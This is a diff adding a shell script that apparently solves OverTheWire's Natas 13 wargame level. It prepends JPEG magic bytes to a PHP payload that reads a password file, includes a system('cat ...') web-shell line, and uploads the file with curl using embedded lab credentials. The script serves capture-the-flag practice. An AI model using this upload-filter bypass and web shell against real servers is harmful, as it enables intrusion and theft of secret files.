@@ -1,0 +1,7 @@
+echo -e "\xFF\xD8\xFF\xE0" > getpass_natas13.php
+
+echo -n '<?$locat = file_get_contents("/etc/natas_webpass/natas14");echo $locat;?>' >> getpass_natas13.php
+
+echo -n '<?php system("cat /etc/natas_webpass/natas14"); ?>'
+
+curl -u natas13:lW3jYRI02ZKDBb8VtQBU1f6eDRo6WEj9 -F "MAX_FILE_SIZE=1000" -F "filename=getpass_natas13.php" -F "uploadedfile=@./getpass_natas13.php" "http://natas13.natas.labs.overthewire.org"
